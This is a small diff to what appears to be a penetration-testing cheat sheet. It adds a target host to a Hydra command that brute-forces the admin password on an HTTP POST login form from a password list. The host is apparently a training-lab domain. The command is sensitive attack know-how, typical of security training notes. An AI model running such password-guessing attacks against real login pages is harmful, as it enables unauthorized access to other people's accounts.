@@ -23,7 +23,7 @@ HTTP GET/POST
 ```shell
 hydra [options] target http-post-form "path:params:condition_string"
 
-hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+hydra -l admin -P /path/to/password_list.txt monitoring.inlanefreight.local http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
 ```
 SMB
 ```bash
